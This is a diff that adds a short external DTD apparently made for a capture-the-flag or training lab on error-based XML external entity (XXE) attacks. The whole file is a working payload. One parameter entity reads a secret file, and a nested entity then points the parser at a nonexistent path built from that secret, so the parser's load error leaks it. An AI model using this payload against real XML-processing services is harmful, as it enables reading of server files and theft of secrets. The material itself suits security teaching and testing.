@@ -1,0 +1,7 @@
+<!-- error.dtd — external DTD for Level 4 (error-based XXE).
+     Reads the secret into a parameter entity, then forces libxml to fail loading
+     a path built from it so the secret leaks in the "failed to load" error. -->
+<!ENTITY % file SYSTEM "file:///var/secret/flag4.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
